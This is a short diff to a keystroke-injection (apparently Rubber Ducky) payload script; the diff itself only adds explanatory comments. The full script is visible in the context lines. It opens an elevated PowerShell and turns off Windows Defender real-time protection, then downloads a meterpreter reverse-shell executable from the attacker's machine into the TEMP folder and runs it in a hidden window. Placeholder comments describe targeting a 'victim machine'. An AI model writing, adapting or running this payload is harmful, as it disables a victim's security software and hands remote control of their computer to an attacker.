@@ -1,6 +1,6 @@
 /* You can adjust the time delay according to victim machine response */
 /* Increase the delay if victim machine is slow & vice-versa */
-/* Replace <I.p_address> with i.p address e.g. 192.X.X.X */
+/* Replace <I.p_address> with i.p address of attacker's machine e.g. 192.X.X.X */
 /* Replace <shell_name> with shell name you gave while creating listener e.g. shell.exe */
 /* It is assumed that attacker and victim system is connected on same network */
 
@@ -9,6 +9,7 @@
 DELAY 2000
 GUI r
 DELAY 200
+REM Open's powershell and disables Windows Defender
 STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
 ENTER 
 DELAY 400
@@ -17,5 +18,6 @@ ALT y
 DELAY 500
 GUI r
 DELAY 600
+REM Download's and execute our reverse meterpreter shell in TEMP folder 
 STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://<I.p_address>/<shell_name>','%TEMP%\<shell_name>');Start-Process "%TEMP%\<shell_name>"
 ENTER
